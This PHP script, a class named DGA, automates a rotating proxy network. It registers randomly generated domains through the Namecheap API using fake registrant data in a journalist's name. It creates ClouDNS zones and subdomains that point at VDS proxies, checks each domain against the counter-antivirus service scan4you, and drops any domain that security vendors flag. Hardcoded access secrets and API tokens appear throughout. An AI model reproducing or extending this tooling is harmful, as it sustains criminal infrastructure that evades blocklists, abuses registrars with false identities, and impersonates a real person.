<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
set_time_limit(0);
$dga = new DGA();
$dga->main();

class DGA
{
    
    function __construct()
    {
        register_shutdown_function(array(
            $this,
            'fatalErrorShutdownHandler'
        ));
        set_error_handler(array(
            $this,
            'errorHandler'
        ));
        require_once("api.class.php");
        require_once("../inc/config.php");
        $this->dbh            = $dbh;
        $this->files          = array();
        $this->config         = $config;
        $this->log_file       = $this->config['main']['dir'] . "logs/domain-error.log";
        $this->log_file_event = $this->config['main']['dir'] . "logs/domain-work.log";
        $this->domains        = $this->config['main']['dir'] . "domain/domains_chk.txt";
        $this->nouns          = $this->loadList("nouns.txt");
        $this->bizw           = $this->loadList("biz_words.txt");
        $this->ext_file       = $this->loadList("extensions.txt");
        $this->server_ip      = $this->config['namecheap']['whitelist_ip'];
        $this->secret         = "eWk9SRUaIcgUOWC928jh";
    }
    
    public function Main()
    {
        if ($_SERVER['REQUEST_METHOD'] == "GET" && isset($_GET['s']) && $_GET['s'] == $this->secret) {
            switch ($_GET['a']) {
                case "scan":
					//scan all domains if >= 3 detections delete...
                    $this->scanPROXYS();
                    break;
                case "reg":
					//count all domains if <= 10 register new and put into temp. file
                    $this->regDomains();
                    break;
                case "check":
                    //loop thru temp domains and check if DNS is rdy (the proxy itself can be used)
					$this->pingPROXYS();
                    break;
                default:
                    echo "Nothing provided!";
                    exit;
            }
        }
    }
    
    public function logError($msg)
    {
        if (file_exists($this->log_file)) {
            $logFile = $this->log_file;
        } elseif (!file_exists($this->log_file)) {
            if (!file_exists($this->log_file)) {
                $ClogFile = fopen($this->log_file, "w");
                $logFile  = $this->log_file;
            }
        }
        file_put_contents($logFile, date("Y/m/d H:i.s", time()) . "-|-" . $msg . "\n\n", FILE_APPEND);
    }
    
    public function errorHandler($code, $message, $file, $line)
    {
        $source = "[" . $_SERVER['HTTP_USER_AGENT'] . " / " . $this->getIp() . "]";
        $data   = 'Error Type: ' . $code . ' Message: ' . $message . ' In file: ' . $file . ' On line: ' . $line . ' Source: ' . $source;
        if (!empty($message)) {
            $msg = $data;
            $this->logError($msg);
            exit();
        }
    }
    
    public function fatalErrorShutdownHandler()
    {
        $last_error = error_get_last();
        $this->errorHandler($last_error['type'], $last_error['message'], $last_error['file'], $last_error['line']);
    }
    
	private function pingProxy($proxy)
	{
		if(!empty($proxy)){
		$ex  = RestClient::post($proxy, array(
				"ping" => "true",
				"s" => "XfqPIvHOQ03EYhgpbPGq"
			));
		return $ex->getResponse();
		}
	}
	
	private function pingPROXYS()
	{
		$proxys = explode("\n\n",file_get_contents($this->domains));
		foreach($proxys as $k=>$proxy){
			if($this->pingProxy($proxy) == "WORKS!"){
				$stmt = $this->dbh->prepare('INSERT INTO proxy (url, last_check) VALUES (?, ?)');
				$stmt->execute(array($proxy, time()));
				unset($proxys[$k]);
			}
		}
		file_put_contents($this->domains,implode("\n\n",$proxys));
	}
	
    private function scanPROXYS()
    {
        $stmt = $this->dbh->prepare("SELECT * FROM proxy");
        $stmt->execute();
		$proxy = $stmt->fetchAll();
		$ListPROXY = array();
		foreach($proxy as $v){
			$ListPROXY[] = $v['url'];
		}
		foreach($ListPROXY as $proxyurl){
			$options           = array();
            $options['debug']  = 0;
            $options['link']   = 0;
            $options['format'] = 'json';
            $url               = parse_url($proxyurl);
			$data              = $this->check_s4y($url['host'], "domain", $options);
			$count             = $this->parseScan($data);
            if ($count >= 1) {
                $this->deleteProxy($proxyurl);
            }else{
				$this->updateProxy($proxyurl);
			}
		}
    }
    
    private function deleteProxy($proxyurl)
    {
        $stmt = $this->dbh->prepare('DELETE FROM proxy WHERE url = ?');
        $stmt->execute(array(
            $proxyurl
        ));
    }
	
	private function updateProxy($proxyurl)
	{
		$stmt = $this->dbh->prepare("UPDATE proxy SET last_check = :last_check WHERE url = :url");
		$time = time();
		$stmt->bindParam(':last_check',$time , PDO::PARAM_STR);   
		$stmt->bindParam(':url', $proxyurl, PDO::PARAM_STR);   
		$stmt->execute(); 
	}
    
    private function parseScan($data)
    {
        $counter = 0;
        $dd      = preg_split('/\r\n|\r|\n/', $data);
        unset($dd[35]);
        foreach ($dd as $v) {
            $p = explode(":", $v);
            if ($p[0] != "OK") {
                $counter = $counter + 1;
            }
        }
        return $counter;
    }
    
    private function countPROXYS()
    {
        $stmt = $this->dbh->prepare('SELECT COUNT(*) FROM proxy');
        $stmt->execute();
        return $stmt->fetchColumn();
    }

    private function returnRandomMasterDomain()
    {
        $stmt = $this->dbh->prepare('SELECT name FROM domains ORDER BY RAND() LIMIT 0,1');
        $stmt->execute();
        return $stmt->fetchColumn();
    }
    
    private function countVDS()
    {
        $stmt = $this->dbh->prepare('SELECT COUNT(*) FROM vds');
        $stmt->execute();
        return $stmt->fetchColumn();
    }
	
    private function regSubdomains()
    {
	$minProxy 	= 20;
	$createSubs	= "5";
        if ($this->countPROXYS() <= $minProxy && $this->countVDS() > 0) {
		$domain     = $this->returnRandomMasterDomain();
		$proxy      = parse_url($this->getVDS());
		$subdomains = $this->loop_sub($createSubs, $proxy['host'], $domain);
		foreach ($subdomains as $domain) {
		    $finalfuckingdomain = $proxy['scheme'] . "://" . $domain . $proxy["path"];
		    $this->logTempDomains($finalfuckingdomain);
		}
        }else{ die("No VDS"); }
    }

    private function regDomains()
    {
	$minProxy 	= 10;
	$createSubs	= "5";
        if ($this->countPROXYS() <= $minProxy && $this->countVDS() > 0) {
		$domains  = $this->rdnDomain(1);
		foreach ($domains as $domain){
			$this->regDomain($domain);
			$this->setDNS($domain);
		}
		foreach ($domains as $domain) {
			$this->createMaster($domain);
			$proxy      = parse_url($this->getVDS());
			$subdomains = $this->loop_sub("5", $proxy['host'], $domain);
			foreach ($subdomains as $domain) {
			    $finalfuckingdomain = $proxy['scheme'] . "://" . $domain . $proxy["path"];
			    $this->logTempDomains($finalfuckingdomain);
			}
		}
        }else{ die("No VDS"); }
    }
    
    private function logTempDomains($domain)
    {
		$current = explode("\n\n",file_get_contents($this->domains));
		$current[] = $domain;
		file_put_contents($this->domains, implode("\n\n",$current));
        #file_put_contents($this->domains, $domain . "\n\n", FILE_APPEND);
    }
    
    private function check_s4y($file,$type='file',$options=array())
	{
		$options['pooling'] = 1;
		$options['id'] = "45483";
		$options['token'] = "76135d7474d2098a9ce1";
		$options['action'] = $type;
		$url='http://scan4you.net/remote.php';

		if (in_array($type,array('file','run')) && (!file_exists($file))) die ("$file dosn`t exist.\n");

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_VERBOSE, $options['debug']);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_POST, true);
	//    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); // Try this if you have problem with certificates
	//    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Try this if you have problem with certificates
		if (!in_array($type,array('file','run'))) $options[$type]=$file;
		else {
			if (class_exists('CURLFile')){
				$cfile = new CURLFile($file,'application/octet-stream',$type);
				$options['uppload']=$cfile;
			} else {
				$options['uppload']='@'.$file;
			}
		}
		if ($options['debug']) echo "DEBUG: send request to $url, fields:".print_r($options,1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $options);
		$response = curl_exec($ch);
		if ($response === false || curl_errno($ch))       return 'ERROR: Error connecting to server - '.curl_error($ch);
		if (curl_getinfo($ch, CURLINFO_HTTP_CODE) != 200) return 'ERROR: Error from server - '.curl_getinfo($ch, CURLINFO_HTTP_CODE);

		list($s,$p)  = explode(':',$response);
		if ($s == 'POOL'){
		$options['pool_id'] = trim($p);
		$options['action'] = 'pool';
		unset($options['uppload']);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $options);
		$response = '';
		$t = time() + 1800;
		do {
			sleep(5);
			if ($options['debug']) echo "DEBUG: send pool request to $url, fields:".print_r($options,1);
			$response = curl_exec($ch);
		}while (!$response || time() > $t);
		if (!$response)       return 'ERROR: Error pooling job';
		}
		curl_close($ch);
		return $response;
	}
    
    private function getIp()
    {
        
        $this->ip = $_SERVER['REMOTE_ADDR'];
        if ($this->ip) {
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $this->ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $this->ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
                $this->ip = $_SERVER['HTTP_X_FORWARDED'];
            } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
                $this->ip = $_SERVER['HTTP_FORWARDED_FOR'];
            } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
                $this->ip = $_SERVER['HTTP_FORWARDED'];
            } elseif (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
                $this->ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
            }
            
            return $this->ip;
        }
        // There might not be any data
        return false;
    }
    
    private function getVDS()
    {
        $stmt = $this->dbh->prepare("SELECT * FROM vds");
        $stmt->execute();
        $vds     = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $vdsList = Array();
        foreach ($vds as $k => $v) {
            $vdsList[] = $v['ip'];
        }
        $vds = $vdsList[array_rand($vdsList)];
        return $vds;
    }
    
    public function logEvent($msg)
    {
        if (file_exists($this->log_file_event)) {
            $logFile = $this->log_file_event;
        } elseif (!file_exists($this->log_file_event)) {
            if (!file_exists($this->log_file_event)) {
                $ClogFile = fopen($this->log_file_event, "w");
                $logFile  = $this->log_file_event;
            }
        }
        file_put_contents($logFile, date("Y/m/d H:i.s", time()) . " -|- " . $msg . "\n\n", FILE_APPEND);
    }
    
    
    private function loadList($file)
    {
        if (!file_exists($file)) {
            return false;
        } else {
            return explode("\n", file_get_contents($file));
        }
    }
    
    
    private function removeN($input)
    {
        if (is_array($input)) {
            foreach ($input as $k => $v) {
                $input[$k] = preg_replace("/\r|\n/", "", $v);
            }
        } else {
            $input = preg_replace("/\r|\n/", "", $input);
        }
        return $input;
    }
    
	private function setDNS($domain)
	{
		$p = explode(".",$domain);
		$url = "https://api.namecheap.com/xml.response";
        $ex  = RestClient::post($url, array(
            "ApiUser" => $this->config['namecheap']['ApiUser'],
            "ApiKey" => $this->config['namecheap']['ApiKey'],
            "UserName" => $this->config['namecheap']['UserName'],
            "Command" => "namecheap.domains.dns.setCustom",
            "ClientIp" => $this->server_ip,
			"SLD" => $p[0],
			"TLD" => $p[1],
			"NameServers" => $this->config['cloudns']['ns'][0].",".$this->config['cloudns']['ns'][1]
			));
		$array =  (array) $ex;
        $this->logEvent(json_encode($array));
	}
	
    private function regDomain($domain)
    {
        $url = "https://api.namecheap.com/xml.response";
        $ex  = RestClient::post($url, array(
            "ApiUser" 		=> $this->config['namecheap']['ApiUser'],
            "ApiKey" 		=> $this->config['namecheap']['ApiKey'],
            "UserName" 		=> $this->config['namecheap']['UserName'],
            "Command" 		=> "namecheap.domains.create",
            "ClientIp" 		=> $this->server_ip,
            "DomainName" 	=> $domain,
            "Years" => "1",
            "AuxBillingFirstName" => "Brian",
            "AuxBillingLastName" => "Krebs",
            "AuxBillingAddress1" => urlencode("P.O.Box 5425"),
            "AuxBillingStateProvince" => "Damascus",
            "AuxBillingPostalCode" => "5425",
            "AuxBillingCountry" => "SY",
            "AuxBillingPhone" => "+963.11273808008",
            "AuxBillingEmailAddress" => "nista@pusikurac.com",
            "AuxBillingOrganizationName" => "ISP",
            "AuxBillingCity" => "Damascus",
            "TechFirstName" => "Brian",
            "TechLastName" => "Brian",
            "TechAddress1" => urlencode("P.O.Box 5425"),
            "TechStateProvince" => "Damascus",
            "TechPostalCode" => "5425",
            "TechCountry" => "SY",
            "TechPhone" => "+963.11273808008",
            "TechEmailAddress" => "nista@pusikurac.com",
            "TechOrganizationName" => "ISP",
            "TechCity" => "Damascus",
            "AdminFirstName" => "Brian",
            "AdminLastName" => "Krebs",
            "AdminAddress1" => urlencode("P.O.Box 5425"),
            "AdminStateProvince" => "Damascus",
            "AdminPostalCode" => "5425",
            "AdminCountry" => "SY",
            "AdminPhone" => "+963.11273808008",
            "AdminEmailAddress" => "nista@pusikurac.com",
            "AdminOrganizationName" => "ISP",
            "AdminCity" => "Damascus",
            "RegistrantFirstName" => "Brian",
            "RegistrantLastName" => "Krebs",
            "RegistrantAddress1" => urlencode("P.O.Box 5425"),
            "RegistrantStateProvince" => "Damascus",
            "RegistrantPostalCode" => "5425",
            "RegistrantCountry" => "SY",
            "RegistrantPhone" => "+963.11273808008",
            "RegistrantEmailAddress" => "nista@pusikurac.com",
            "RegistrantOrganizationName" => "ISP",
            "RegistrantCity" => "Damascus",
            "NameServers" => $this->config['cloudns']['ns'][0].",".$this->config['cloudns']['ns'][1]
        ));
        $array =  (array) $ex;
        $this->logEvent(json_encode($array));
    }
    
    private function createMaster($domain)
    {
        $url = "https://api.cloudns.net/dns/register.json";
        $ex  = RestClient::post($url, array(
            "auth-id" => $this->config['cloudns']['id'],
            "auth-password" => $this->config['cloudns']['pass'],
            "domain-name" => $domain,
            "zone-type" => "master",
            "ns[0]" => $this->config['cloudns']['ns'][0],
            "ns[1]" => $this->config['cloudns']['ns'][1]
        ));
		$array =  (array) $ex;
        $this->logEvent(json_encode($array));
    }
    
    private function createA($main, $sub, $ip)
    {
        $url = "https://api.cloudns.net/dns/add-record.json";
        $ex  = RestClient::post($url, array(
            "auth-id" => $this->config['cloudns']['id'],
            "auth-password" => $this->config['cloudns']['pass'],
            "domain-name" => $main,
            "record-type" => "A",
            "host" => $sub,
            "record" => $ip,
            "ttl" => "3600"
        ));
        $array =  (array) $ex;
        $this->logEvent(json_encode($array));
    }
    
    private function chk_ns($domain)
    {
        $url = "https://api.cloudns.net/domains/get-nameservers.json";
        $ex  = RestClient::post($url, array(
            "auth-id" => $this->config['cloudns']['id'],
            "auth-password" => $this->config['cloudns']['pass'],
            "domain-name" => $domain
        ));
        return str_replace(' ', '', $ex->getResponseMessage());
    }
    
    private function rdnDomain($times)
    {
        $domains = array();
        for ($x = 1; $x <= $times; $x++) {
            $bizw  = $this->removeN($this->bizw[rand(0, 100)]);
            $noun  = $this->removeN($this->nouns[rand(0, 2326)]);
            $noun2 = $this->removeN($this->nouns[rand(0, 2326)]);
            $ext   = $this->removeN($this->ext_file[rand(0, 15)]);
			$bizw  = str_replace(" ","",$bizw);
			$noun  = str_replace(" ","",$noun);
			$noun2 = str_replace(" ","",$noun2);
            $final = array(
                $bizw,
                $noun,
                $noun2
            );
            shuffle($final);
            $main      = implode("", $final) . $ext;
            $domains[] = $main;
        }
        return $domains;
    }
    
    private function loop_sub($times, $ip, $main)
    {
        $subdomains = array();
        for ($x = 1; $x <= $times; $x++) {
            
            $bizw  = $this->removeN($this->bizw[rand(0, 100)]);
            $noun  = $this->removeN($this->nouns[rand(0, 2326)]);
			$bizw  = str_replace(" ","",$bizw);
			$noun  = str_replace(" ","",$noun);
            $final = array(
                $bizw,
                $noun
            );
            shuffle($final);
            $entry = implode("", $final);
            $this->createA($main, $entry, $ip);
            $subdomains[] = $entry . "." . $main;
        }
        return $subdomains;
    }
    
}

?>
